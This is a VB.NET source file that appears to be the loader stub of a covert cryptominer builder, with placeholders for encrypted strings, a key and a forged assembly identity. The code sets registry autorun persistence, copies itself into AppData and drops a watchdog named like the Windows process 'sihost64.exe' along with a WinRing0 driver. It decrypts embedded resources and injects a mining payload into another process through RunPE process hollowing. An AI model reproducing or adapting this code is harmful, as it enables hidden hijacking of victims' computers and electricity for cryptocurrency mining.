﻿Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False
#Const WD = False
#Const EnableGPU = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If

Public Class Program
    Public Shared lb As String = GetString("#LIBSPATH")
    Public Shared bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb

    Public Shared Sub Main()
#If INS Then
        Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
        Install()
#End If
        Initialize()
    End Sub

#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                System.IO.File.WriteAllBytes(PayloadPath, System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName))
                Thread.Sleep(2 * 1000)
                BaseFolder()
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Function GetString(ByVal input As String)
        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
    End Function


    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType(GetString("#DLLSTR")).GetMethod(GetString("#DLLOAD"), BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub BaseFolder()
        Try
            System.IO.Directory.CreateDirectory(bD)
            Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))

#If WD Then
                    For Each proc As Process In Process.GetProcessesByName("sihost64")
                        proc.Kill()
                    Next

                    Threading.Thread.Sleep(3000)

                    System.IO.File.WriteAllBytes(bD & "sihost64.exe", GetTheResource("#watchdog"))

                    If Process.GetProcessesByName("sihost64").Length < 1 Then
                        Process.Start(bD & "sihost64.exe")
                    End If
#End If

            System.IO.File.WriteAllBytes(bD & "WR64.sys", GetTheResource("#winring"))
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function KillLastProc()
        On Error Resume Next
        Dim options As ConnectionOptions = New ConnectionOptions()
        options.Impersonation = ImpersonationLevel.Impersonate
        Dim scope As ManagementScope = New ManagementScope("\\" + Environment.UserDomainName + "\root\cimv2", options)
        scope.Connect()

        Dim wmiQuery As String = String.Format("Select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
        Dim query As ObjectQuery = New ObjectQuery(wmiQuery)
        Dim managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher(scope, query)
        Dim managementObjectCollection As ManagementObjectCollection = managementObjectSearcher.Get()

        For Each retObject As ManagementObject In managementObjectCollection
            If retObject("CommandLine").ToString().Contains("--pool") Then
                Environment.Exit(0)
                Return True
            End If
        Next
        Return False
    End Function

    Public Shared Sub Initialize()
        If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
            Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000)
        End If

        Try
            Dim x As Byte() = GetTheResource("#eth")
            Dim xm As Byte() = New Byte() {}
            Dim rS As String = ""

            BaseFolder()

            Try
                Try
                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
                        For Each entry As ZipArchiveEntry In archive.Entries
                            If entry.FullName.Contains("et") Then
                                Using streamdata As Stream = entry.Open()
                                    Using ms = New MemoryStream()
                                        streamdata.CopyTo(ms)
                                        xm = ms.ToArray
                                    End Using
                                End Using
                            End If
                        Next
                    End Using
                Catch ex As Exception
                End Try

            Catch ex As Exception
            End Try
            Dim argstr As String = GetString("#ARGSTR") + rS
            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
            KillLastProc()
            Run(GetTheResource("#dll"), argstr, xm)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash_ As New MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
